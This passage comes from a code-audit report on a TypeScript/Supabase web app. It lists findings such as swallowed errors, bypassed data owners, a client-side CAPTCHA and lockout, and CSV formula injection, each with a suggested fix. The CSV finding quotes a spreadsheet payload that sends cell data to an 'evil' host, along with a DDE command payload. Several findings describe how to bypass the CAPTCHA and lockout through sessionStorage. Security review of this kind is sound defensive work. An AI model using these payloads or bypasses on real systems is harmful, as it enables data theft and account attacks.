- **Where:** src/services/general-application.service.ts:199-202 with 28-66 & 106-118; src/services/explore.service.ts:411,419,424,435 with 155-231
- **What breaks:** save() does syncToProfileBackground(...).catch(reportError) and syncToAirtable(...).catch(reportError); explore() does persistQuery/fetchWebResults/writeCache(...).catch(reportError). But each helper has its own try/catch that log.warn's and RETURNS a resolved promise — it never rejects (verified: syncToAirtable 63-65, syncToProfileBackground 115-117, persistQuery 161-163, checkCache 182-185, writeCache 199-201, fetchWebResults 227-230). A resolved promise's .catch never runs, so every reportError is dead code. Confirmed against src/services/logger.service.ts (emit only writes to console) and src/services/CLAUDE.md (a bare log.error/warn 'is not reporting'): Airtable-sync-down, cache-write RLS denials, query-persist failures are downgraded to a console warning that never reaches audit_log/triage. Ops believes these paths are monitored; they are invisible.
- **Smallest fix:** Either let each helper reject (remove the internal swallow) so the caller's .catch(reportError) fires, or call reportError inside the helper's catch. Do one, not the current no-op combination.

### [High] QuestService writes journey_progress directly, bypassing JourneyService's task-ID whitelist  `ownership` (CONFIRMED)
- **Where:** src/services/quest.service.ts:190-204 (completeSelfReportStep), 233-253 (getAllJourneyProgress) vs src/services/journey.service.ts:27-45,154-236
- **What breaks:** JourneyService is the sole owner of journey_progress and validates task_id against VALID_TASK_IDS ('possible injection attempt', line 161). QuestService writes the SAME table directly via upsert({ task_id: `quest-step-${stepId}`, phase: 'first_steps' }) with stepId unvalidated and phase hardcoded — an arbitrary stepId lands straight in. quest-step-* ids are deliberately NOT in the whitelist, so this write only works BY bypassing the owner. Every quest step is also mislabeled phase 'first_steps' regardless of its real phase, so getAllJourneyProgress/JourneyService.getProgress (which don't filter task_id) aggregate quest rows into first_steps and pollute journey counts. When the whitelist or completion semantics change, QuestService silently diverges.
- **Smallest fix:** Route quest self-report completion through JourneyService.upsertTask (extend the whitelist to cover quest-step ids, or add a JourneyService method that owns the quest-step namespace) so there is one validated writer.

### [Medium] journey.upsertTask sets the dedupe timestamp BEFORE the write — failed retry reports success, nothing written  `error-handling` (CONFIRMED)
- **Where:** src/services/journey.service.ts:206-217
- **What breaks:** journeyDedupe.set(dedupeKey, now) runs at line 206, before the awaited upsert at 208. If the upsert throws, the dedupe entry stays. A user who clicks again within 2s (the natural reaction to a failed save) hits the window at 200-205, logs 'Skipped duplicate upsert', and returns void — the UI reads that as success while the DB has no row. Under two concurrent clicks the second returns 'success' before the first resolves; if the first then fails, both callers believe the task completed. The map is also never pruned (unbounded, though small). Net: task completions silently lost while showing green.
- **Smallest fix:** Set the dedupe entry only after a successful write and delete it in the catch so a post-failure retry is allowed; or dedupe on an in-flight promise instead of a pre-write timestamp.

### [Medium] general-application is a second writer of profiles.professional_background (bypasses the owner)  `ownership` (CONFIRMED)
- **Where:** src/services/general-application.service.ts:106-118,158,197-199 vs src/services/profile.service.ts:158-202 (ProfileService.updateFields)
- **What breaks:** NOTE: the first pass called this stored XSS — that premise is FALSE. save() sanitizes fields via sanitizeFields → sanitizeRecordFields → deepSanitize (src/lib/validators/shared-input.ts:72, src/lib/security.ts:99-124 stripHtml), so about_yourself is already HTML-stripped before it is stored and re-read; syncToProfileBackground writes an already-sanitized value. The real defect is ownership: ProfileService is the sanctioned sole writer of professional_background (allow-listed in updateFields, line 167) and general-application writes profiles.professional_background directly, and also copies profiles.email into general_applications.email at create (line 158). Two writers of one fact means sanitization/allow-list policy now lives in two places and will drift when one side changes.
- **Smallest fix:** Call ProfileService.updateFields(userId, { professional_background: aboutYourself }) instead of the direct profiles.update, so the single owner enforces allow-listing and sanitization.

### [Medium] about_yourself / professional_background / Airtable / feedback.email duplicated best-effort with no reconciliation  `ownership` (CONFIRMED)
- **Where:** src/services/general-application.service.ts:28-66,96-118,158,194-203; src/services/feedback.service.ts:71-76
- **What breaks:** general_applications.about_yourself is copied to profiles.professional_background on every save; the whole application is mirrored into Airtable on every save (fire-and-forget, swallowed on failure); general_applications.email is a snapshot of profiles.email at create; feedback.user_email is a copy of the submitted email. All copies are best-effort with zero reconciliation, so they WILL drift: change your email and every prior application row + feedback row + Airtable record keeps the old address; a dropped Airtable sync leaves DB and Airtable permanently inconsistent with no repair job. save() also re-fetches the row (line 195) and syncs the fetched value, so under interleaved autosave+manual-save the mirror can be written from a stale read.
- **Smallest fix:** Treat profiles as sole owner of email/professional_background and derive by join/read instead of copying; make the Airtable mirror reconcilable (store last-synced hash + a resync path) rather than fire-and-forget.

### [Medium] explore.loadPopularAndRecent has no user filter — recents leak across users / popularity wrong at scale  `boundary` (PLAUSIBLE)
- **Where:** src/services/explore.service.ts:101-151
- **What breaks:** The query selects exploration_queries (query_text, user_id) with NO .eq('user_id', ...) filter, capped at the latest 500 rows network-wide (POPULAR_QUERY_LIMIT). 'recents' (lines 135-143) are then built from those global rows — if RLS does not scope the table to the caller, one user's free-text exploration queries surface as another user's 'recent searches', a cross-user data leak of potentially personal text. If RLS DOES scope to the caller, then 'popular' counts are computed over only that one user's rows, making the network-popularity feature silently per-user and meaningless. Either way the 500-row global cap means at real scale the popularity tally is truncated to whatever was searched most recently, not most often.
- **Smallest fix:** Compute popularity in a SECURITY DEFINER RPC/aggregate view over all rows, and derive 'recents' from a separate query explicitly filtered to the current user id; don't reuse one unfiltered 500-row pull for both.
- _added-in-verification_

### [Medium] quest.getSystemVerificationData swallows per-query errors and returns empty arrays — false-negative verification  `error-handling` (CONFIRMED)
- **Where:** src/services/quest.service.ts:260-287
- **What breaks:** Three parallel queries; each error is only log.error'd (277-279, never reportError) and the result falls back to `?? []` (282-284). A transient failure on project_applications makes a user who actually submitted/was accepted look like they have NO applications, so system-verified quest steps flip to incomplete — the user is told they haven't done something they have. Partial failure is undetectable: if one of three fails the other two still return data, yielding a half-populated snapshot that downstream step logic treats as authoritative. Nothing reaches triage, so it looks healthy in ops.
- **Smallest fix:** Distinguish 'no rows' from 'query failed' — throw or return an explicit error/undefined per source instead of coercing to [], and report via reportError.

### [Medium] Services touch window/localStorage directly — violates the scoped rule and Node-testability  `dependency` (CONFIRMED)
- **Where:** src/services/announcement.service.ts:38-61 (readLkgFromStorage/writeLkgToStorage); src/services/stats.service.ts:69-96 (readCache/writeCache)
- **What breaks:** src/services/CLAUDE.md:3 explicitly forbids window/localStorage in services and says to route last-known-good caches through src/lib/memory-cache.ts / src/lib/cached-session.ts. Both services hand-roll window.localStorage. Consequences: these functions can't run in the Node test target the rule mandates; LKG cache logic (TTL, versioned key eviction) is duplicated in two places so eviction bugs must be fixed twice; and cache data lands outside the sanctioned layer that centralizes eviction/versioning.
- **Smallest fix:** Replace the inline window.localStorage code with the sanctioned lib/cached-session / lib/memory-cache helpers as the rule requires.

### [Medium] PushSubscriptionService is entirely browser/DOM orchestration — belongs in lib, not services  `dependency` (CONFIRMED)
- **Where:** src/services/push-subscription.service.ts:38-70,199-375 (navigator.serviceWorker, window.PushManager, Notification, window.matchMedia)
- **What breaks:** src/services/CLAUDE.md requires services to be plain-data-in/out, no DOM, testable in Node. This 'service' is almost entirely service-worker registration, pushManager.subscribe, Notification.permission, and window.matchMedia — it cannot be unit-tested in Node and mixes browser-integration with the data concern (the push_subscriptions upsert). Placing it under services normalizes web-platform code in the pure-data layer, the exact drift the rule exists to stop.
- **Smallest fix:** Move the ServiceWorker/Push/Notification orchestration into src/lib or src/integrations; keep only the push_subscriptions read/write (accepting an already-obtained subscription) in the service.

### [Medium] Duplicate-key errors suppressed by substring-matching error.message — brittle across PG/PostgREST wording  `error-handling` (CONFIRMED)
- **Where:** src/services/announcement.service.ts:191 (markRead), 252 (recordAction); src/services/class.service.ts:183 (follow)
- **What breaks:** These swallow conflicts with `if (error && !error.message.includes('duplicate'))`. That is a string sniff on a message with no stable contract. If PostgREST/Postgres changes or localizes the wording, or returns 23505 with different prose, either (a) a genuine unique-violation stops being recognized as benign and is thrown/reported as a real error (noisy failed markRead/follow), or (b) a different error that happens to contain 'duplicate' gets silently swallowed. Idempotency here should key off the SQL state code.
- **Smallest fix:** Match error.code === '23505' (unique_violation), or use insert with upsert/ignoreDuplicates like other paths already do.

### [Medium] class-status emails fail silently to console and fan out sequentially per admin  `error-handling` (CONFIRMED)
- **Where:** src/services/class-emails.ts:44-65 (sendOne catch→console.warn), 76-122 (outer catch→console.warn), 102-118 (sequential await loop); called void at src/services/class.service.ts:133,139,148,157
- **What breaks:** This file doesn't even import the logger or reportError — every failure is a raw console.warn (63,120), which src/services/CLAUDE.md:6 says is not reporting. If send-transactional-email is down or the admin-recipient RPC fails, teachers/admins silently stop receiving submit/approve/changes/archive notices and nothing surfaces in audit_log/triage; the class workflow looks healthy while its human notifications are dead. The admin fan-out awaits each send in a for-loop (103-118), so N admins = N sequential edge round-trips and one slow/hung send delays or (on outer throw) drops the rest. class.service calls with `void`, so even a thrown outer error is discarded.
- **Smallest fix:** Report failures via reportError instead of console.warn, and fan out admin sends with Promise.allSettled so one slow/failed send neither blocks nor drops the others.

### [Low] journey_progress.completed_at is overwritten to now() on every re-completion upsert  `ownership` (CONFIRMED)
- **Where:** src/services/journey.service.ts:208-217; same pattern src/services/quest.service.ts:190-199
- **What breaks:** The upsert always sets completed_at: new Date().toISOString() on conflict (onConflict user_id,phase,task_id), so re-saving an already-completed task (double click, autosave, re-render) bumps the original completion time forward. Any streak/badge/analytics logic reading completed_at as 'when first finished' sees a moving target, and the audit trail of the real completion instant is lost.
- **Smallest fix:** Only set completed_at on the transition to completed — via a DB default/trigger or COALESCE(existing, now()) — not on every upsert.

### [Low] reference search interpolates raw query into an ILIKE pattern (wildcard injection / full scan); listReference unbounded  `security` (CONFIRMED)
- **Where:** src/services/reference.service.ts:83 (.ilike('name', `%${q}%`)); 37-46 (listReference no limit)
- **What breaks:** q is user input placed straight into a LIKE pattern with no escaping of %, _ or \. A user typing '%' or '_' turns the filter into match-all or arbitrary-wildcard matching — not SQL injection (PostgREST parametrizes the value) but LIKE-pattern injection: unexpected matches and, on larger reference tables, forced full scans a hostile client can spam to load the DB. listReference() has no LIMIT at all, so it returns entire reference_* tables.
- **Smallest fix:** Escape %, _ and \ in q before building the pattern; add a sane LIMIT to listReference.

### [Low] cohort.recordRegistrationClick computes userId then never passes it and silently no-ops when logged out  `under-engineering` (CONFIRMED)
- **Where:** src/services/cohort.service.ts:116-125
- **What breaks:** It fetches getUserSafe(), derives userId, guards `if (!userId) return`, then calls register_for_cohort_click with only _cohort_id/_referrer — userId is never passed. The getUserSafe round-trip is pointless, and a registration click from a user whose session momentarily can't resolve is silently dropped with no error and no telemetry — a registration-intent analytics event just vanishes. If the RPC relies on auth.uid() server-side, the whole client fetch is dead code.
- **Smallest fix:** Remove the unused getUserSafe/userId (let the RPC use auth.uid()) or actually pass the id; either way don't silently drop the click.

### [Low] feedback insert is retried without idempotency — network flap after a committed insert duplicates the row  `error-handling` (CONFIRMED)
- **Where:** src/services/feedback.service.ts:68-78
- **What breaks:** The insert is wrapped in retryTransientWrite with no idempotency key and no unique constraint on (user_id, message, created-window). If the first insert commits server-side but the response is lost (timeout/5xx) — exactly the transient condition the retry targets — the retry inserts a second identical feedback row. Admins reviewing feedback see duplicated submissions.
- **Smallest fix:** Give the retry a client-generated idempotency key backed by a unique index, or don't retry a bare INSERT that has no conflict handling.

### [Low] Service imports a type from a component file, inverting the UI→service dependency arrow  `dependency` (CONFIRMED)
- **Where:** src/services/explore.service.ts:22 (import type { WebSearchResult } from '@/components/resources/ExploreResultsSection')
- **What breaks:** src/services/CLAUDE.md:4 states a service's types live beside it and are never imported from a component — the arrow points UI→service, never up. explore.service now depends on a component module: deleting/renaming ExploreResultsSection breaks the service, the service can't be reasoned about or tested without pulling a React component tree, and it establishes the exact upward dependency the rule forbids.
- **Smallest fix:** Move WebSearchResult into explore.types.ts (or a shared type module) and have both the service and the component import it from there.

---

## Core lib: root utilities

### [High] Two divergent lazyWithRetry implementations with OPPOSITE reload behavior; the hard-reload one is what actually ships  `ownership` (CONFIRMED)
- **Where:** src/lib/lazy-with-retry.ts:105-116 and src/lib/lazyWithRetry.ts:43-49
- **What breaks:** Two modules export lazyWithRetry for the same job (stale-chunk recovery). lazy-with-retry.ts (hyphen) forces a one-shot hard page reload with a cache-bust param (window.location.replace, lines 105-116). lazyWithRetry.ts (camelCase) explicitly REFUSES to reload — header cites 'memory: No Auto-Reload On Deploy' and only dispatches an 'app:chunk-load-failed' event (43-49). Verified imports: EVERY route/component imports the HARD-RELOAD variant (App.tsx:22, AppLayout, DashboardPage, LandingPage, ApplicationsPage, AgGrid, etc.); the banner variant that honors the documented decision has ZERO importers and is dead code, despite its own comment claiming it is 'Enforced by the lazy/requires-retry ESLint rule.' So in production a post-deploy chunk error silently reloads the user's tab and destroys unsaved form state — the exact outcome deploy-watcher.ts:5-11 says must never happen. The documented architecture decision is violated by the code that actually runs, and the compliant implementation is unreachable. Two retry counts (2 vs 3), two delay tables, two chunk classifiers, and the magic string RELOAD_FLAG='__lovable_chunk_reload__' is shared by hand with deploy-watcher.ts:17.
- **Smallest fix:** Delete the dead banner variant OR (per the No-Auto-Reload decision) delete the hard-reload branch in lazy-with-retry.ts and re-point all imports to the banner behavior; make reload-vs-banner one documented choice and gate any reload behind explicit user action.

### [High] Login CAPTCHA answer stored and verified entirely client-side — trivially bypassed from the console  `security` (CONFIRMED)
- **Where:** src/lib/auth-captcha.ts:31-40,56-62,69-74,184-206
- **What breaks:** createChallenge() computes answer=left+right and writeState() persists the full state INCLUDING the plaintext answer to sessionStorage['tfn:login-captcha-state'] (56-62). verifyLoginCaptchaAnswer() compares user input to that stored answer, and markLoginCaptchaVerified() writes a verified-until timestamp (184-192). client-request-throttle.ts:219-223 uses hasFreshLoginCaptchaVerification() as the gate that admits an auth attempt. An attacker reads .answer from sessionStorage, or writes sessionStorage['tfn:login-captcha-verified-until']=far-future, or posts a BroadcastChannel 'verified' message — applySyncedCaptchaState (69-74) accepts ANY same-origin verifiedUntil with no provenance check — and the entire client CAPTCHA gate is disabled. isLoginCaptchaRequired() hardcodes 'return true' (163-165), so the subsystem's only enforcement point is defeatable in one line. It stops zero scripted credential-stuffing tools (which never touch this wrapper); it only inconveniences honest users.
- **Smallest fix:** Do not treat the client math-CAPTCHA as a security control. Rely on server-verified Turnstile (turnstile-verification.ts) + server-side rate limiting. If a client challenge is kept, never persist the answer and never let a client-set flag gate auth-request admission.

### [Medium] Dead ternary in lockout attempt counter — both branches byte-identical  `error-handling` (CONFIRMED)
- **Where:** src/lib/auth-lockout.ts:63
- **What breaks:** `const nextAttempts = current.lockedUntil > now ? current.attempts + 1 : current.attempts + 1;` — both branches are identical, so the condition is inert. The intended 'attempts while already locked' accounting was never written. Invalid attempts arriving during an active lock increment the counter the same as fresh-window attempts, and since shouldLock resets attempts to 0 on lock, the lockLevel escalation is driven by a counter whose during-lock semantics were clearly meant to differ. A future reader cannot recover intent and will 'fix' it wrong; progressive escalation does not behave as the threshold design implies.
- **Smallest fix:** Collapse to `const nextAttempts = current.attempts + 1;` and delete the misleading condition, OR implement the real during-lock rule with a test pinning it.

### [Medium] Four disagreeing hardcoded trusted-host lists; canonical production domain omitted from the redirect allowlist  `ownership` (CONFIRMED)
- **Where:** src/lib/security.ts:195,787-790; src/lib/oauth-ui-guard.ts:10-14; src/lib/canonical-origin.ts:22-26
- **What breaks:** Four copied host sets disagree. security.ts ALLOWED_REDIRECT_DOMAINS=['techfleetnetwork.lovable.app','guide.techfleet.org'] (195) — does NOT include techfleet.network or www.techfleet.network, yet canonical-origin.ts:20-26 and oauth-ui-guard.ts:10-14 both name those as primary production hosts. So isSafeRedirectUrl('https://www.techfleet.network/...') returns false whenever the current origin isn't already that host — a redirect from the lovable.app host to the apex is rejected and silently dumped to the /dashboard fallback (normalizeSafeRedirectTarget). Meanwhile ALLOWED_ORIGINS (787-790) bakes a specific preview UUID host 'id-preview--3ae718a9-...lovable.app' into production trust. Adding a real custom domain later means editing 4 files; missing one yields either a broken redirect or an over-trusted preview host.
- **Smallest fix:** Create one owned constant (e.g. TRUSTED_TFN_HOSTS in canonical-origin.ts) and derive redirect/origin/oauth checks from it; drop the baked-in preview UUID origin from production trust.

### [Medium] hasPathTraversal throws URIError on malformed input — crashes file-upload validation on a benign filename  `error-handling` (CONFIRMED)
- **Where:** src/lib/security.ts:462-470 (called at validateFileUpload line 755)
- **What breaks:** hasPathTraversal() calls decodeURIComponent(input) with no try/catch (463). decodeURIComponent throws URIError on any malformed percent sequence — 'report_100%_done.pdf', '50%.pdf', or a lone '%'. validateFileUpload() calls hasPathTraversal(file.name) — the RAW name, not the already-sanitized safeName — after the type/extension checks (755). A user uploading a validly-typed PNG/PDF whose name contains a bare '%' triggers an uncaught URIError inside validation instead of a clean {valid:false}/{valid:true}, surfacing as a hard crash of the upload flow. User-triggerable with an entirely benign file.
- **Smallest fix:** Wrap the decode: `let normalized; try { normalized = decodeURIComponent(input); } catch { return true; }` (treat undecodable as suspicious) so the guard returns a verdict instead of throwing.

### [Medium] Global DOMPurify.addHook mutation at module import rewrites anchors for every sanitize call app-wide  `dependency` (CONFIRMED)
- **Where:** src/lib/security.ts:696-701
- **What breaks:** At module load, DOMPurify.addHook('afterSanitizeAttributes', ...) is registered on the shared DOMPurify singleton, forcing target=_blank and rel=noopener/noreferrer/nofollow onto EVERY surviving <a> in EVERY DOMPurify.sanitize call anywhere in the app — including sanitizeAIMarkdown (1099-1107) and any other consumer that imports DOMPurify directly, wanted or not. Merely importing security.ts for an unrelated helper (isValidUuid) silently changes anchor behavior for unrelated rendering code — a hidden, import-order-dependent global side effect. If a build inlines a single helper and tree-shakes security.ts away, the hook silently vanishes and anchors stop being hardened.
- **Smallest fix:** Move anchor-hardening into sanitizeHtml itself (post-process the result or use DOMPurify per-call hooks/config) instead of registering a process-global hook as an import side effect.

### [Medium] withTrace corrupts the ambient trace id for every async operation it is meant to correlate  `error-handling` (CONFIRMED)
- **Where:** src/lib/trace.ts:23-38
- **What breaks:** withTrace(fn) sets globalThis[TRACE_ID_KEY]=id, calls fn, and restores prev in a SYNCHRONOUS finally (29-31). If fn is async (the normal case for edge-call/audit flows this module exists to correlate), the finally runs the instant fn returns its promise — long before the awaited work runs. Every getCurrentTraceId() call in that async continuation reads the restored/previous value (usually undefined), so audit_log rows written during the async op get the wrong trace id or none. The module's stated purpose (1-12: joining frontend call, x-trace-id edge header, and DB rows under one id) silently fails for exactly the async operations it targets; admins cannot reconstruct chains.
- **Smallest fix:** Make withTrace await/return the promise and restore in an async finally, OR stop using a mutable global and pass the trace id explicitly / use AsyncLocalStorage-style context that survives awaits.

### [Medium] query-config identity-cache invariant is violated by its own key factory AND by a third divergent purge list  `boundary` (CONFIRMED)
- **Where:** src/lib/query-config.ts:20-27 vs 38-72; src/components/ProgressCacheIdentityGuard.tsx:22-53
- **What breaks:** query-config.ts:20-27 declares a hard invariant: every per-user query MUST start with ['identity', userId, ...] so a sign-out/identity purge cannot leak a prior user's snapshot. Only profile() and mfaGate() actually call identityKey(). journeyProgress, journeyCompleted, questSelections/SelfReport/AllProgress, notifications, announcementReadIds, dashboardGeneralApp/ProjectApps/Prefs, adminRole, and twoFactorEnrollment all build plain arrays like ['admin-role', userId] with NO 'identity' prefix. With gcTime 24h (react-query.ts:45), an identity-scoped invalidation cannot evict them. Worse, the actual account-switch purge (ProgressCacheIdentityGuard.tsx) is a THIRD hardcoded key list that removes only a fixed set of progress keys and OMITS admin-role, two-factor-enrollment, notifications, and dashboard-* entirely. On a fast user-switch without a full sign-out (which alone calls appQueryClient.clear()), the previous user's admin-role and 2FA-enrollment state persist in cache. The file documents a security invariant three sources of truth break against each other.
- **Smallest fix:** Route every per-user key through identityKey(userId, ...) and derive ProgressCacheIdentityGuard's purge from the same factory (or clear the whole QueryClient on any identity transition) so admin-role, 2FA, notifications, and dashboard data are actually covered.

### [Medium] CSV export is vulnerable to spreadsheet formula injection  `security` (CONFIRMED)
- **Where:** src/lib/csv-export.ts:4-11
- **What breaks:** escapeCSV only quote-wraps values containing comma/quote/newline (7-9). It does NOT neutralize formula-trigger lead chars = + - @ (and tab/CR). downloadCSV exports tabular data with user-controlled fields (names, bios, application answers). A user setting a profile field to =HYPERLINK("http://evil/?"&A1,"click") or =cmd|'/c calc'!A1 produces a CSV that executes as a formula when an admin opens it in Excel/Sheets — data exfiltration or local command execution on the admin's machine. This is an export admins actually open.
- **Smallest fix:** In escapeCSV, if the stringified value starts with = + - @ (or tab/CR), prefix a single quote, then apply the existing quote-escaping.

### [Medium] email-domain-existence check fails OPEN on any error and does not cache the fail-open verdict  `error-handling` (CONFIRMED)
- **Where:** src/lib/email-domain-validation.ts:14-21
- **What breaks:** validateEmailDomainExists invokes the validate-email-domain edge function and, on ANY error, does `if (error) return { valid: true };` (18) — accepting the address. The control that blocks fake/disposable/typo domains at signup is bypassable by inducing the function to error: rate-limit it, trip its DNS/upstream timeout, or hit it during any outage, and every domain is accepted. The fail-open branch returns before the domainCache.set on line 20, so it re-accepts on every attempt — an attacker automating signups against a degraded validator sails through indefinitely.
- **Smallest fix:** Fail closed for this security-relevant check: return a retryable 'we couldn't verify your email domain, try again' message, or degrade to a stricter local allowlist — never blanket-accept on error.

### [Medium] Global window.fetch monkeypatch firewall is UX-only and silently fails open on any thrown error  `boundary` (CONFIRMED)
- **Where:** src/lib/client-request-throttle.ts:193-244; src/lib/client-input-firewall.ts:142-174,192-221
- **What breaks:** installClientRequestThrottle() overwrites window.fetch to run input-firewall inspection, rate-limiting, and the CAPTCHA gate, returning synthetic 400/403/429 Responses. Two structural problems: (1) enforced ONLY inside the app's own fetch wrapper — credential stuffing/scraping via curl/Python/another tab's XHR hits Supabase directly and sees none of it; it stops honest users' typos, not attackers. (2) The whole pipeline is inside try/catch (238-240) that on ANY throw (e.g. inspectBody's `await input.clone().text()` at client-input-firewall.ts:170, or a URL parse edge) silently falls through to originalFetch — the firewall disables itself with no signal. The code's own comment calls the server the 'authoritative wall,' but callers treat these 400s as protection, inviting under-investment in the real server-side defense.
- **Smallest fix:** Treat this strictly as client UX/abuse-friction, never a security boundary; ensure mass-assignment, XSS, size, and rate-limit checks are enforced server-side in edge functions / RLS independent of this wrapper.

### [Medium] 1,100-line security.ts grab-bag ships server/edge-only and fabricated logic into the browser bundle  `over-engineering` (CONFIRMED)
- **Where:** src/lib/security.ts:252-297,879-891,900-942,1009-1045
- **What breaks:** This client lib carries functions that are server/edge concerns with no legitimate browser caller: isPaymentWebhookReplaySafe (260 — webhook idempotency is verified server-side, never in the SPA), isXmlPayloadSafe/XXE (886), isWebSocketHandshakeAllowed (879), getSBOMMetadata (1015 — returns hardcoded version '1.0.0' and lastScanDate=new Date() i.e. a fabricated live-timestamp SBOM), isDependencyAcceptableForUse (1039), and a CRS/ModSecurity WAF pattern set hasCRSAttackPattern (906-935). Consequences: (a) dead weight + attack-pattern regexes bloat the main bundle, each a potential ReDoS surface run on client input; (b) their presence signals 'security is handled' when real enforcement must be server-side; (c) getSBOMMetadata actively lies if consumed for compliance.
- **Smallest fix:** Move webhook/XML/WebSocket/WAF/SBOM/dependency logic to the edge functions that actually run it (or delete if grep finds no callers), and split the genuinely client-side helpers (sanitizeHtml, safeHref, isValidUuid, redaction) into a lean module.

### [Medium] Audit-log email hashing is reversible 64-bit unsalted truncation; raw email still logged for reset events  `security` (CONFIRMED)
- **Where:** src/lib/account-activity.ts:56-74,82-86
- **What breaks:** hashEmail() takes SHA-256 of the lowercased email and truncates to the first 16 hex chars (64 bits), unsalted (63-74), with a comment claiming it avoids 'storing raw PII.' Email is a small enumerable space; a 64-bit unsalted hash of a known-format value is reversible by dictionary/rainbow lookup, so audit_log 'email_hash' is de-anonymizable — false PII assurance that is itself a compliance risk. Separately, for EMAIL_VISIBLE_EVENTS (password_reset_requested/failed/google_only_blocked) the raw normalized email is written verbatim as attempted_email (84) into a table admins query frequently (7-8).
- **Smallest fix:** If pseudonymization is required, HMAC the email with a server-held key (not client-side truncated SHA), and reconsider whether raw attempted_email belongs in a frequently-queried admin log.

### [Medium] audit_log is written client-side via write_audit_log with client-supplied user id and email — forgeable and floodable  `ownership` (PLAUSIBLE)
- **Where:** src/lib/account-activity.ts:76-107
- **What breaks:** logAccountActivity fires the write_audit_log RPC directly from the browser (96-103), including pre-auth events (signup_attempt_started, login_failed) — so the RPC must be callable with the anon/publishable key. Both p_user_id (100) and attempted_email (84) are client-supplied and unauthenticated at that point. A script can therefore forge arbitrary audit_log rows: attribute fake login/signout/reset events to ANY user id, inject arbitrary attempted_email values, or simply flood the table admins 'query frequently' (7-8) to bury real signal or inflate storage. The audit log is presented as a trustworthy admin diagnostic but its client-facing writes are attacker-controlled — the owner of this fact (the auth backend) is bypassed.
- **Smallest fix:** Write account-activity audit rows server-side from the auth/edge layer (or a SECURITY DEFINER RPC that derives user id from the JWT and rejects client-supplied ids), rate-limit the endpoint, and never let the client set p_user_id.
- _added-in-verification_

### [Medium] Raw error messages are logged verbatim to audit_log, re-leaking the PII that hashEmail pretends to protect  `security` (PLAUSIBLE)
- **Where:** src/lib/account-activity.ts:96-103 (p_error_message); vs redactLogValue in src/lib/security.ts:351-372
- **What breaks:** logAccountActivity passes payload.errorMessage straight into p_error_message (102) with no redaction, and copies payload.details values in verbatim (89-92, only length-capped). security.ts already has a redactLogValue()/createSecurityLogEntry() pipeline (351-379) that masks emails/JWTs/Bearer tokens — but this hot path does not use it. Auth/Supabase error strings routinely embed the attempted email or token fragments (e.g. 'User already registered: foo@bar.com'), so those land unredacted in the same frequently-queried admin table where hashEmail(84-85) went to the trouble of pseudonymizing the email field. The pseudonymization is defeated by the adjacent free-text column.
- **Smallest fix:** Run errorMessage and details through redactLogValue/createSecurityLogEntry before the write_audit_log call, and cap/normalize error text server-side.
- _added-in-verification_

### [Low] Three separate stripHtml implementations plus duplicated nbsp normalization  `under-engineering` (CONFIRMED)
- **Where:** src/lib/html.ts:7-21; src/lib/strip-html.ts:5-22; src/lib/security.ts:66-74; nbsp logic in html.ts:35-51 and security.ts:611-614
- **What breaks:** stripHtml exists three times with subtly different behavior: strip-html.ts collapses whitespace (\s+->' ') and uses `<[^>]+>` (19); html.ts does NOT collapse and uses `<[^>]*>` plus a normalizeRichTextHtml pre-pass (7-21); security.ts is a third variant using `<[^>]*>` without collapsing (66-74). The rich-text/nbsp normalization is copy-pasted between html.ts:35-51 and security.ts:611-614. Callers get inconsistent plain-text output depending on which they import, and a fix to the SSR-fallback tag regex or an entity edge case must be made in three places or it drifts.
- **Smallest fix:** Keep one stripHtml and one normalizeRichTextHtml, re-export from the others (or delete duplicates and re-point imports); pin behavior with a shared test.

### [Low] React Query retry gate relies on English message-substring matching instead of the available error code  `error-handling` (CONFIRMED)
- **Where:** src/lib/react-query.ts:46-63; src/lib/auth-error-classifier.ts:41-81; src/lib/security.ts:385-406
- **What breaks:** The retry policy decides NOT to retry auth/permission failures by lowercasing error.message and matching 'unauthorized'/'forbidden'/'permission denied'/'row-level security'/'42501' (48-58). It never checks error.code or error.status, though the error object is in hand. If the backend/proxy returns a reworded, localized, or wrapped message, or 42501 arrives only in .code, the gate misses and React Query retries a genuine 403/RLS denial up to 2 more times — extra load and a slower, more confusing failure. The same string-sniffing brittleness runs through classifyAuthError's CRED/RATE/NETWORK lists (already bitten once per the AUTH-VICHEA-FIX comments) and safeErrorMessage.
- **Smallest fix:** Prefer typed codes as the primary signal — check e.code==='42501' / e.status===403 (or 401) before falling back to message text.

### [Low] Client lockout is decorative and its own error copy hands the attacker the bypass  `security` (CONFIRMED)
- **Where:** src/lib/auth-lockout.ts:25-48,94-106; src/lib/client-input-firewall.ts:64-68
- **What breaks:** Progressive auth lockout lives entirely in sessionStorage (readStoredState/writeStoredState) and maybeAutoHealAuthLockout() silently drops any lock with <=60s remaining on page load (94-106) — so the 30s BASE_LOCK is auto-cleared on any reload. sessionStorage is per-tab and attacker-controlled: clearing it, or opening a new tab/private window, resets the lockout instantly. The input-firewall's own lock message (client-input-firewall.ts:66) literally instructs the user to 'open a new tab or private window to continue' — spelling out the bypass. The header comment concedes the server bucket is 'the real brute-force defense,' yet the code and copy present the client lock as protection.
- **Smallest fix:** Treat the client lockout purely as local UX friction; enforce brute-force protection fully server-side (peek/record_rate_limit_failure) independent of client storage, and don't advertise the reset path in user copy.

### [Low] pdf-to-markdown mutates global pdfjs config at import and forces main-thread parsing  `dependency` (CONFIRMED)
- **Where:** src/lib/pdf-to-markdown.ts:19-21
- **What breaks:** At module import, `(pdfjsLib.GlobalWorkerOptions).workerSrc = ''` (21) mutates the shared pdfjs singleton for the whole app, disabling the worker for any other pdfjs consumer too. With no worker, getDocument()/getTextContent() parse on the main thread; a large multi-hundred-page workshop PDF blocks the UI thread during the admin import. MAX_OUTPUT_CHARS caps output size but not parse cost — the freeze happens before truncation. Import-time global mutation also makes behavior order-dependent if another module configures pdfjs differently.
- **Smallest fix:** Configure workerSrc inside extractMarkdownFromPdf (scoped) or ship the pdf.worker asset and keep the worker enabled; at minimum move the mutation out of module top-level.

### [Low] safeCompare is not constant-time despite its docstring  `security` (CONFIRMED)
- **Where:** src/lib/security.ts:415-424
- **What breaks:** Documented as 'constant-time string comparison to prevent timing attacks,' but it loops to Math.max(a.length,b.length) and does per-char work proportional to the longer input (420-422) — total work varies with input length, and charCodeAt comparison on JS strings under a JIT is not a constant-time primitive. Any caller trusting it to compare a secret against attacker-supplied input does not get the claimed guarantee. The overstated claim is the risk: it discourages reaching for a vetted primitive where one is actually needed.
- **Smallest fix:** Drop the 'constant-time' claim (call it best-effort equality), or compare fixed-length hashed values (HMAC/SHA of both sides) so length no longer varies the work.

### [Low] Cached-session coalescing is defeated by auth churn and rejects all coalesced callers on one transient blip  `error-handling` (CONFIRMED)
- **Where:** src/lib/cached-session.ts:26-55
